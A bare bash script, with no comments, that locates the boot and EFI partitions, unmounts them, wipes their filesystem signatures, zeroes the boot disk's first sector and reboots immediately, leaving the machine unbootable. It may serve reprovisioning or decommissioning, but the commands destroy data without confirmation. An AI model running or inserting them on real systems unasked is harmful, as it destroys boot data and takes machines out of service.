#!/bin/bash

P1=$(lsblk -l | grep /boot/efi | cut -d" " -f1)
P2=$(lsblk -l | grep /boot | grep -v efi | cut -d" " -f1)
MAJ=$(lsblk -l | grep $P1 | tr -s " " | cut -d" " -f2 | cut -d: -f1)
BOOT_DISK=$(lsblk -l | grep "${MAJ}:0" | cut -d" " -f1)

umount /boot/efi
umount /boot
wipefs -a /dev/${P1}
wipefs -a /dev/${P2}
dd if=/dev/zero of=/dev/${BOOT_DISK} bs=512 count=1
shutdown -r now


